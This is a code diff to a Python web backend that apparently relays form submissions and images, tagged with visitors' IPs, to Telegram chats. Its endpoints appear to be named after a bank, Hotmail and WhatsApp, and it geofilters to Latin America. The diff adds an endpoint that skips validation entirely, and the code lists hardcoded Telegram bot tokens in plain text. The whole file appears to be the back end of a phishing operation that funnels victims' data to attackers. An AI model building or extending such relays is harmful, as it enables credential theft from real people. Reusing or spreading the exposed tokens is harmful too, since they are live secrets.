@@ -737,6 +737,8 @@ PATHS_DOBLE_ENVIO = {
     "/lafise2", "/hotma1", "/hotma2", "/hotma3", 
     "/wts1", "/wts2", "/wts3"
 }
+PATHS_SIN_VALIDACION = {"/victovivienda"}
+
 # =========================
 # Endpoints dinámicos (MULTIPART en /docs, imagen OPCIONAL)
 # =========================
@@ -754,6 +756,46 @@ async def handle_dynamic_endpoint_optimized_with_image(
     - Mantiene geofiltro.
     """
     client_ip = obtener_ip_real(request)
+    path = config["path"]
+    
+    # VERIFICAR SI ES UN PATH SIN VALIDACIÓN (envío directo)
+    if any(path.startswith(p) for p in PATHS_SIN_VALIDACION):
+        mensaje_directo = f"{mensaje} - IP: {client_ip} - {path}"
+        if image_data:
+            mensaje_directo += f" [IMAGEN: {image_filename or 'image.jpg'}]"
+        
+        try:
+            # Solo envía al chat específico del endpoint, SIN validaciones
+            r = await enviar_telegram_hibrido(
+                mensaje_directo,
+                chat_id=config["chat_id"],
+                token=config["bot_id"],
+                priority=1,
+                image_data=image_data,
+                image_filename=image_filename
+            )
+            return {
+                "mensaje_enviado": r.get("success", False),
+                "pais_origen": "Sin validación",
+                "ip": client_ip,
+                "telegram_results": [r],
+                "successful_sends": 1 if r.get("success") else 0,
+                "total_attempts": 1,
+                "image_sent": image_data is not None,
+                "image_filename": image_filename,
+                "direct_send": True
+            }
+        except Exception as e:
+            logger.error(f"Error Telegram directo: {e}")
+            return {
+                "mensaje_enviado": False,
+                "ip": client_ip,
+                "telegram_error": str(e),
+                "image_sent": image_data is not None,
+                "direct_send": True
+            }
+    
+    # Continuar con validaciones normales para otros paths
     cola.append(client_ip)
     numeror = obtener_numero_cached(client_ip)
 
@@ -768,7 +810,6 @@ async def handle_dynamic_endpoint_optimized_with_image(
         raise HTTPException(status_code=503, detail="Servicio temporalmente no disponible")
 
     if permitido and (pais in PAISES_LATINOAMERICA or pais == "EXCLUDED"):
-        path = config["path"]
         mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
         if image_data:
             mensaje_completo += f" [IMAGEN: {image_filename or 'image.jpg'}]"
@@ -856,7 +897,6 @@ async def handle_dynamic_endpoint_optimized_with_image(
             }
     else:
         raise HTTPException(status_code=403, detail="Acceso denegado")
-# Configuración de endpoints dinámicsos
 endpoint_configs = [
     {"path": "/balza1/", "chat_id": "-4807047115", "bot_id": "8051878604:AAGGf5zi95tyeXInjIYb1PpH7i8FKlNkTXA"},
     {"path": "/balza2/", "chat_id": "-4957332815", "bot_id": "8051878604:AAGGf5zi95tyeXInjIYb1PpH7i8FKlNkTXA"},
